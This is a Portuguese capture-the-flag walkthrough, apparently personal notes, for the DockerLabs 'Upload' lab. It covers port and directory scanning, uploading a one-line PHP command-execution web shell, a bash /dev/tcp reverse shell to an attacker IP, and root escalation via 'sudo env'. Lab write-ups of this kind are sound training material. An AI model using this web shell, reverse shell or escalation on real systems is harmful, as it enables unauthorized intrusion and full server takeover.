<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.upload</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.upload</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA UPLOAD</span></strong></p><p></p><p><img src="images/153-1.png" alt="images/153-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/153-2.png" alt="images/153-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sV -sC  --open -p- -T5 -n -Pn          </span></strong><strong>                      </strong><strong></strong></p><p><strong>                     </strong><img src="images/153-3.png" alt="images/153-3.png" />                                   </p><p>Temos a porta 80 aberta.     </p><p><strong><span style="color:#ff7800;">80/tcp open  http    Apache httpd 2.4.52</span></strong></p><p></p><p><strong>Agora vamos explorar a porta 80 no navegador colocando o ip da máquina </strong><strong><a href="http://172.17.0.3/">http://172.17.0.3/</a></strong> .</p><p></p><p><img src="images/153-4.png" alt="images/153-4.png" /></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">gobuster dir -u </span></strong><strong><a href="http://172.17.0.3">http://172.17.0.3</a></strong><strong><span style="color:#ff7800;"> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .txt,.php,.html,.py</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><img src="images/153-5.png" alt="images/153-5.png" /></p><p></p><p>V<span style="color:#000000;">amos entra na pasta /uploads</span><span style="color:#ff7800;">  </span><a href="http://172.17.0.3/uploads/">http://172.17.0.3/uploads/</a><span style="color:#ff7800;"></span></p><p><span style="color:#ff7800;"> </span><span style="color:#ff7800;"></span></p><p><span style="color:#ff7800;"></span><img src="images/153-6.png" alt="images/153-6.png" /></p><p></p><p><strong>Vamos subir um arquivo em php através</strong> <a href="http://172.17.0.3/">http://172.17.0.3/</a></p><p></p><p><img src="images/153-7.png" alt="images/153-7.png" /></p><p></p><p><strong>nano shell.php</strong></p><p></p><p><strong>&lt;?php</strong><strong></strong></p><p><strong>		system($_GET[&#39;cmd&#39;]);</strong><strong></strong></p><p><strong>?&gt;</strong></p><p></p><p><img src="images/153-8.png" alt="images/153-8.png" /></p><p></p><p><strong>GET</strong> <strong>é um método de solicitação usado em HTTP para enviar dados a um servidor web. Quando usado em uma URL, como em ?cmd=value, indica que um parâmetro chamado cmd está sendo passado com um valor específico. No contexto deste código PHP, ele captura o valor do parâmetro cmd passado na URL e o utiliza como um comando para executar no sistema.</strong></p><p></p><p><img src="images/153-9.png" alt="images/153-9.png" /></p><p></p><p><strong>Veja que o arquivo foi enviado com sucesso</strong>.</p><p></p><p><img src="images/153-10.png" alt="images/153-10.png" /></p><p></p><p>A<strong>o clicar no </strong><strong><span style="color:#ff7800;">shell.php</span></strong><strong>,temos a URL </strong><strong><a href="http://172.17.0.3/uploads/shell.php">http://172.17.0.3/uploads/shell.php</a></strong><strong> .</strong><strong></strong></p><p><strong></strong><img src="images/153-11.png" alt="images/153-11.png" /></p><p></p><p>vamos acrescentar o comando ?cmd=whoami</p><p><a href="http://172.17.0.3/uploads/shell.php?cmd=whoami">http://172.17.0.3/uploads/shell.php?cmd=whoami</a></p><p></p><p><strong>veja que somos usuário </strong><strong><span style="color:#ff7800;">www-data</span></strong></p><p></p><p><img src="images/153-12.png" alt="images/153-12.png" /></p><p></p><p><strong>O próximo passo, depois de verificarmos que temos execução remota de comandos na máquina, é executar um comando que envia um console interativo para nossa máquina atacante. Isso é conhecido como </strong><strong><span style="color:#ff7800;">Shell reverso</span></strong><strong> . Para fazer isso, ouvimos previamente nossa máquina atacante, por exemplo com </strong><strong><span style="color:#ff7800;">netcat</span></strong><strong> :</strong></p><p></p><p><strong>Vamos pegar uma reverse shell no site: </strong><strong><a href="https://www.revshells.com/">https://www.revshells.com/</a></strong> .</p><p></p><p><img src="images/153-13.png" alt="images/153-13.png" /></p><p></p><p><strong>Depois vamos abrir o </strong><strong><span style="color:#ff7800;">BURP SUITE</span></strong><strong> e ir na ferramenta </strong><strong><span style="color:#ff7800;">DECONDER</span></strong><strong> e colar o reverse shell.   </strong><strong><span style="color:#ff7800;">bash -c &#39;-i &gt;&amp; /dev/tcp/192.168.0.24/4444 0&gt;&amp;1&#39; </span></strong><strong>.</strong></p><p></p><p><img src="images/153-14.png" alt="images/153-14.png" /></p><p></p><p><strong>Antes de colar deixe o netcat na escuta</strong>. </p><p></p><p><img src="images/153-15.png" alt="images/153-15.png" /></p><p></p><p><strong>Temos a reverse shell.</strong></p><p></p><p><img src="images/153-16.png" alt="images/153-16.png" /></p><p></p><p><strong>Agora vamos buscar privilégios root com </strong><strong><span style="color:#ff7800;">sudo -l</span></strong></p><p></p><p><strong>Ao realizar o comando </strong><strong><span style="color:#ff7800;">sudo -l</span></strong><strong> podemos ver que podemos obter acesso root usando </strong><strong><span style="color:#ff7800;">env</span></strong><strong>.</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><img src="images/153-17.png" alt="images/153-17.png" /></p><p></p><p>Se formos para o site: <a href="https://gtfobins.github.io/gtfobins/env/#sudo">https://gtfobins.github.io/gtfobins/env/#sudo</a> podemos ver que temos uma maneira de obter o acesso root.</p><p></p><p><img src="images/153-18.png" alt="images/153-18.png" /></p><p></p><p><span style="color:#ff0000;">obs</span>: tirei o /bin/sh    e   coloquei  /bin/bash.</p><p><span style="color:#ff7800;">sudo env /bin/bash</span>  </p><p></p><p><img src="images/153-19.png" alt="images/153-19.png" /></p><p></p><p>somos root</p><p></p><p><span style="color:#ff0000;text-decoration:line-through;">bobmarley</span></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
